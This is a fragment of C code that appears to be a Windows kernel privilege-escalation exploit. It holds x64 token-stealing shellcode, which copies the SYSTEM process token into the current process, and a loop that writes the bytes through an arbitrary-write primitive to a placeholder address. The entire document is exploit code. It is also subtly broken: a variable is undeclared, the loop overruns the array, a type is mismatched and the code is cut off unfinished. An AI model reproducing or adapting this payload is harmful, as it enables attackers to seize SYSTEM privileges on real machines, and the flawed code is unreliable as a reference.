#include <windows.h>
#include <stdint.h>

VOID arbitrary_write(uint64_t, uint64_t);

unsigned char shellcode[] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
    0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
    0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
    0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
    0x04, 0x00, 0x00, 0xeb, 0xfe, 0xc3
};

    uint64_t addr = 0xDEADBEEF;

int main(){
    for (int i = 0; i <= (sizeof(shellcode)/sizeof(unsigned char)); i++)  {
    
        arbitrary_write(shellcode[i], (PVOID)dest);  
        dest = addr + (i * sizeof(unsigned char));
    
    }
